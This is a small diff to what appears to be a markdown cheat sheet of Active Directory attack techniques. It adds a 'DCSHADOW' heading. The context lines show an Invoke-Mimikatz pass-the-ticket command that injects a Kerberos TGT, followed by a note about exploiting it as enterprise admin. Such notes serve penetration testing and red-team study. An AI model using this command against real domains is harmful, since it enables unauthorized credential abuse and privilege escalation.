@@ -390,6 +390,8 @@ Inject the TGT ticket
 Invoke-Mimikatz -Command '"kerberos::ptt <Ticket-Path>"'
 ```
 #### then exploit the tgt as enterprise admin :)
+
+# DCSHADOW
 --------------------------------------------------------------
 
 # Check LIST
